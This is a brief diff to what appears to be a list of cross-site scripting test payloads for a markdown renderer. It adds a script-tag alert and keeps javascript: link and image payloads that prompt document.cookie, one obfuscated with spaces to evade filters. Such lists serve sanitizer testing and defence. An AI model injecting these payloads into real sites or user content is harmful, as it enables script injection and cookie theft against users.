@@ -1,3 +1,4 @@
+<script>alert("1")</script>
 [a](javascript:prompt(document.cookie))
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 ![a](javascript:prompt(document.cookie))\
